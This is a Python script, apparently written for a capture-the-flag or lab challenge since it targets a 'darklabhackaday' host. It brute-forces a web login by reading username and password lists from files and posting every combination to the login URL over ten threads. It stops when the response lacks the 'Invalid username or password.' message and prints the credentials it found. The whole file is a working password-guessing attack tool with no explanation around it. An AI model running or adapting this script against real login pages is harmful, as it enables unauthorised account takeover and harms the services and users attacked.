import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Read usernames and passwords from files
with open("username.txt", "r") as user_file:
    usernames = [line.strip() for line in user_file.readlines()]

with open("password.txt", "r") as pass_file:
    passwords = [line.strip() for line in pass_file.readlines()]

url = "http://web-q3-v3x52zk4.darklabhackaday.com:8080"

# Function to attempt login with a username and password


def try_login(user, passw):
    print("Trying:", user, passw)
    response = requests.post(
        url, data={"username": user, "password": passw}, allow_redirects=False)
    if "Invalid username or password." not in response.text:
        print(f"Valid credentials found - Username: {user}, Password: {passw}")
        return user, passw
    return None


# Execute brute force attack with multithreading
found_credentials = None
with ThreadPoolExecutor(max_workers=10) as executor:
    # Use a list comprehension to start all threads
    future_to_credentials = {executor.submit(try_login, user, passw): (user, passw)
                             for user in usernames for passw in passwords}

    for future in as_completed(future_to_credentials):
        result = future.result()
        if result:
            found_credentials = result
            # Cancel other threads if we found the credentials
            for future in future_to_credentials:
                future.cancel()
            break

if found_credentials:
    print("Credentials found:", found_credentials)
else:
    print("No valid credentials found.")
